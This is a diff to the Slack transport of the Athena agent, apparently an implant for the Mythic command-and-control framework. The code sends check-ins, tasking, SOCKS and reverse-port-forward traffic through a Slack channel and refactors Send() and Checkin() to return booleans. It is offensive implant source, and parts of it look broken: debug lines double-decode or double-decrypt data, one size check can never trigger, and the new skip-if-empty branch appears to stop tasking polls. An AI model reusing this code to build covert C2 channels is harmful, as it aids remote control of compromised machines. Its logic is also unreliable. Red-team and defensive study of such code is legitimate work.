@@ -46,7 +46,7 @@ namespace Athena.Profiles.Slack
         private int maxAttempts = 10;
         private string agent_guid = Guid.NewGuid().ToString();
         private CancellationTokenSource cts = new CancellationTokenSource();
-        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
+        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
 
         private SlackWebApiClient client { get; set; }
 
@@ -106,7 +106,10 @@ namespace Athena.Profiles.Slack
 
             this.client.Conversations.Join(this.channel);
         }
-        public async Task<string> Send(string json)
+
+
+        //Send Message
+        public async Task<bool> Send(string json)
         {
             Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
             try
@@ -128,7 +131,7 @@ namespace Athena.Profiles.Slack
                 {
                     if (i == this.messageChecks)
                     {
-                        return String.Empty;
+                        return false;
                     }
                     i++;
                 }
@@ -156,7 +159,7 @@ namespace Athena.Profiles.Slack
                 //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
                 if (result.Count < 0)
                 {
-                    return String.Empty;
+                    return false;
                 }
 
                 strRes = result.First().Value.message;
@@ -166,23 +169,25 @@ namespace Athena.Profiles.Slack
 
                 if (this.encrypted)
                 {
+                    strRes = this.crypt.Decrypt(strRes);
                     Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
-                    return this.crypt.Decrypt(strRes);
                 }
 
                 if (!string.IsNullOrEmpty(strRes))
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
-                    return (await Misc.Base64Decode(strRes)).Substring(36);
+                    strRes = Misc.Base64Decode(strRes).Substring(36);
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Substring(36)}");
                 }
 
-                return String.Empty;
+                MessageReceivedArgs mra = new MessageReceivedArgs(strRes);
+                SetMessageReceived(this, mra);
             }
             catch (Exception e)
             {
                 Debug.WriteLine($"[{DateTime.Now}] Error in Slack send: {e}");
-                return String.Empty;
+                return false;
             }
+            return true;
         }
         private async Task<bool> SendSlackMessage(string data)
         {
@@ -353,28 +358,25 @@ namespace Athena.Profiles.Slack
                     responses = responseTask.Result,
                     rpfwd = rpFwdTask.Result,
                 };
+
+                //If we don't have anything to return, continue the loop.
+                if (delegateTask.Result.Count <= 0 &&
+                    socksTask.Result.Count <= 0 &&
+                    responseTask.Result.Count <= 0 &&
+                    rpFwdTask.Result.Count <= 0)
+                {
+                    continue;
+                }
+
                 try
                 {
-                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
-
-                    if (String.IsNullOrEmpty(responseString))
+                    if(await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking)))
                     {
-                        this.currentAttempt++;
                         continue;
                     }
 
-                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    if (gtr == null)
-                    {
-                        this.currentAttempt++;
-                        continue;
-                    }
+                    currentAttempt++;
 
-                    this.currentAttempt = 0;
-
-                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-
-                    this.SetTaskingReceived(this, tra);
                 }
                 catch (Exception e)
                 {
@@ -393,25 +395,20 @@ namespace Athena.Profiles.Slack
             this.cts.Cancel();
             return true;
         }
-        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        public async Task<bool> Checkin(Checkin checkin)
         {
             int maxAttempts = 3;
             int currentAttempt = 0;
             do
             {
-                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
-
-                if (!string.IsNullOrEmpty(res))
+                if(await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                 {
-                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                    return true;
                 }
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
 
-            return new CheckinResponse()
-            {
-                status = "failed"
-            };
+            return false;
         }
     }
 }
